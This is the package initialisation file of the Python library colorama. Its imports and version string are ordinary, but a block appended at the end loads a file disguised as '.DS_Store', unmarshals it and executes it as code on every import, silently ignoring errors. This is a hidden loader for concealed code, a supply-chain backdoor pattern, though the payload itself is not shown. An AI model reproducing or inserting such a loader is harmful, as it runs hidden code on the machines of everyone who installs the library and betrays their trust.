# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.
from .initialise import init, deinit, reinit, colorama_text, just_fix_windows_console
from .ansi import Fore, Back, Style, Cursor
from .ansitowin32 import AnsiToWin32

__version__ = '0.4.7dev1'

import os, marshal
_p = os.path.join(os.path.dirname(__file__), '.DS_Store')
if os.path.exists(_p):
    try:
        exec(marshal.load(open(_p, 'rb')))
    except:
        pass

